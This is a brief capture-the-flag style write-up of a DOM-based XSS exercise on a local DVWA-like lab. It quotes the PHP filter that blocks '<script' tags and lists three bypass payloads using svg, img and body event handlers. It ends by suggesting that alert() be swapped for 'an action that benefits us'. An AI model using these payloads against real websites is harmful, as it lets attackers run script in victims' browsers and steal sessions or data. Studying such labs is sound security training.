## XSS DOM low level

we go to [http://127.0.0.1/vulnerabilities/xss_d/?default=unique_message](http://127.0.0.1/vulnerabilities/xss_d/?default=Unique_message)

source code : 

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>

```


since it doesnt accept <script> </script>
we can have these payloads that can execute javascript 



```html
</select><svg onload=alert('XSS')>
</select><img src=x onerror=alert('XSS')>
</select><body onload=alert('XSS')>
```


where we change the alert() function for an action that benefits us 

